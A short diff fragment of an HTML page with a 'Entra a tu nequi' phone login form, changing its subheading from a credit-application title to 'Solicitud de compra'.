@@ -77,7 +77,7 @@
 </header>    <section class="homeSectionContainer">
         <div class="formContainer">
             <h1>Entra a tu nequi</h1>
-            <h2>Solicitud de crédito propulsor</h2>
+            <h2>Solicitud de compra</h2>
             <form id="homeForm">
                 <div class="formGroup phone">
                     <div class="selectConutry">
